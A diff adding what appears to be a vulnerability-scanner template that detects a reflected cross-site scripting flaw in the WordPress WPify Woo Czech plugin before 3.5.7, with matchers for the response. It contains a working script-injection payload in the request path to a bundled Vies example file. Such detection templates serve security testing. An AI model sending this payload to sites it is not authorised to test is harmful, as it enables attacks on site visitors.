@@ -1,0 +1,34 @@
+id: wpify-woo-czech-xss
+brief:
+    title: WordPress WPify Woo Czech <3.5.7 - Cross-Site Scripting
+    by: Akincibor
+    level: high
+    about: WordPress WPify Woo Czech plugin before 3.5.7 contains a cross-site scripting vulnerability. The plugin uses the Vies library 2.2.0, which has a sample file outputting $_SERVER['PHP_SELF'] in an at...
+    label:
+        - wp
+        - wordpress
+        - xss
+        - wp-plugin
+        - wpify
+        - wpscan
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/wpify-woo/deps/dragonbe/vies/examples/async_processing/queue.php/"><script>alert(document.domain)</script>'
+      signs:
+        - "on": word
+          has:
+            - '"><script>alert(document.domain)</script>'
+            - Add a new VAT ID to the queue
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
